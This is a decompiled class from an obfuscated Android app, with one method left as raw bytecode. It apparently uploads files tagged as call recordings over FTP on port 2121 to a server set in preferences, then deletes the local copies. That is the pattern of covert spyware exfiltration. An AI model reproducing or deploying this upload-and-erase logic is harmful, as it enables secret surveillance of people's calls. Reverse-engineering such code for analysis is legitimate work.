package com.app.system.common.f.a;

import android.content.Context;
import android.content.SharedPreferences;
import com.app.system.common.d.a.o;
import java.io.File;

public class c
  implements e
{
  private final String a;
  private final File b;
  
  public c(String paramString, File paramFile)
  {
    this.a = paramString;
    this.b = paramFile;
  }
  
  private void b(Context paramContext)
  {
    if (new o(null, this.a).a(paramContext, this.b.getName(), this.b) == 0) {
      this.b.delete();
    }
  }
  
  /* Error */
  private void c(Context paramContext)
  {
    // Byte code:
    //   0: aload_1
    //   1: ldc 48
    //   3: iconst_0
    //   4: invokevirtual 54	android/content/Context:getSharedPreferences	(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   7: ldc 56
    //   9: ldc 58
    //   11: invokeinterface 64 3 0
    //   16: astore_2
    //   17: new 66	com/security/c/a
    //   20: dup
    //   21: invokespecial 67	com/security/c/a:<init>	()V
    //   24: astore_1
    //   25: aload_1
    //   26: aload_2
    //   27: sipush 2121
    //   30: ldc 69
    //   32: ldc 69
    //   34: invokevirtual 72	com/security/c/a:a	(Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;)Z
    //   37: ifeq +202 -> 239
    //   40: new 74	java/lang/StringBuilder
    //   43: astore_2
    //   44: aload_2
    //   45: invokespecial 75	java/lang/StringBuilder:<init>	()V
    //   48: aload_2
    //   49: ldc 77
    //   51: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   54: pop
    //   55: aload_2
    //   56: aload_0
    //   57: getfield 21	com/app/system/common/f/a/c:b	Ljava/io/File;
    //   60: invokevirtual 84	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   63: pop
    //   64: ldc 86
    //   66: aload_2
    //   67: invokevirtual 89	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   70: iconst_0
    //   71: anewarray 4	java/lang/Object
    //   74: invokestatic 95	com/security/d/a:d	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
    //   77: new 74	java/lang/StringBuilder
    //   80: astore_2
    //   81: aload_2
    //   82: invokespecial 75	java/lang/StringBuilder:<init>	()V
    //   85: aload_2
    //   86: ldc 97
    //   88: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   91: pop
    //   92: aload_2
    //   93: aload_0
    //   94: getfield 19	com/app/system/common/f/a/c:a	Ljava/lang/String;
    //   97: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   100: pop
    //   101: aload_2
    //   102: ldc 99
    //   104: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   107: pop
    //   108: aload_2
    //   109: aload_0
    //   110: getfield 21	com/app/system/common/f/a/c:b	Ljava/io/File;
    //   113: invokevirtual 34	java/io/File:getName	()Ljava/lang/String;
    //   116: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   119: pop
    //   120: aload_2
    //   121: invokevirtual 89	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   124: astore_2
    //   125: aload_1
    //   126: aload_0
    //   127: getfield 21	com/app/system/common/f/a/c:b	Ljava/io/File;
    //   130: invokevirtual 102	java/io/File:getAbsolutePath	()Ljava/lang/String;
    //   133: aload_2
    //   134: invokevirtual 105	com/security/c/a:a	(Ljava/lang/String;Ljava/lang/String;)Lcom/security/c/b;
    //   137: astore_3
    //   138: new 74	java/lang/StringBuilder
    //   141: astore 4
    //   143: aload 4
    //   145: invokespecial 75	java/lang/StringBuilder:<init>	()V
    //   148: aload 4
    //   150: ldc 107
    //   152: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   155: pop
    //   156: aload 4
    //   158: aload_2
    //   159: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   162: pop
    //   163: aload 4
    //   165: ldc 109
    //   167: invokevirtual 81	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   170: pop
    //   171: aload 4
    //   173: aload_3
    //   174: invokevirtual 84	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   177: pop
    //   178: ldc 86
    //   180: aload 4
    //   182: invokevirtual 89	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   185: iconst_0
    //   186: anewarray 4	java/lang/Object
    //   189: invokestatic 95	com/security/d/a:d	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
    //   192: getstatic 112	com/app/system/common/f/a/c$1:a	[I
    //   195: aload_3
    //   196: invokevirtual 118	com/security/c/b:ordinal	()I
    //   199: iaload
    //   200: tableswitch	default:+28->228, 1:+31->231, 2:+31->231, 3:+31->231
    //   228: goto +11 -> 239
    //   231: aload_0
    //   232: getfield 21	com/app/system/common/f/a/c:b	Ljava/io/File;
    //   235: invokevirtual 41	java/io/File:delete	()Z
    //   238: pop
    //   239: aload_1
    //   240: invokevirtual 120	com/security/c/a:a	()V
    //   243: goto +37 -> 280
    //   246: astore_2
    //   247: goto +34 -> 281
    //   250: astore_2
    //   251: ldc 86
    //   253: ldc 122
    //   255: iconst_1
    //   256: anewarray 4	java/lang/Object
    //   259: dup
    //   260: iconst_0
    //   261: aload_2
    //   262: aastore
    //   263: invokestatic 124	com/security/d/a:a	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
    //   266: ldc 86
    //   268: aload_2
    //   269: invokevirtual 127	java/io/IOException:getMessage	()Ljava/lang/String;
    //   272: ldc 122
    //   274: invokestatic 132	com/security/d/b:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    //   277: goto -38 -> 239
    //   280: return
    //   281: aload_1
    //   282: invokevirtual 120	com/security/c/a:a	()V
    //   285: aload_2
    //   286: athrow
    //   287: astore_1
    //   288: goto -8 -> 280
    //   291: astore_1
    //   292: goto -7 -> 285
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	295	0	this	c
    //   0	295	1	paramContext	Context
    //   16	143	2	localObject1	Object
    //   246	1	2	localObject2	Object
    //   250	36	2	localIOException	java.io.IOException
    //   137	59	3	localb	com.security.c.b
    //   141	40	4	localStringBuilder	StringBuilder
    // Exception table:
    //   from	to	target	type
    //   25	228	246	finally
    //   231	239	246	finally
    //   251	277	246	finally
    //   25	228	250	java/io/IOException
    //   231	239	250	java/io/IOException
    //   239	243	287	java/lang/Exception
    //   281	285	291	java/lang/Exception
  }
  
  public void a(Context paramContext)
  {
    if (paramContext.getSharedPreferences("pref", 0).getBoolean("use-ftp-for-files-transfer", true)) {
      c(paramContext);
    } else {
      b(paramContext);
    }
  }
  
  public boolean equals(Object paramObject)
  {
    boolean bool1 = false;
    if ((paramObject != null) && ((paramObject instanceof c)))
    {
      paramObject = (c)paramObject;
      boolean bool2 = bool1;
      if (this.a.equals(((c)paramObject).a))
      {
        bool2 = bool1;
        if (this.b.equals(((c)paramObject).b)) {
          bool2 = true;
        }
      }
      return bool2;
    }
    return false;
  }
  
  public String toString()
  {
    return String.format("REG.CALL=%s", new Object[] { this.b.getName() });
  }
}


/* Location:              ~/com/app/system/common/f/a/c.class
 *
 * Reversed by:           J
 */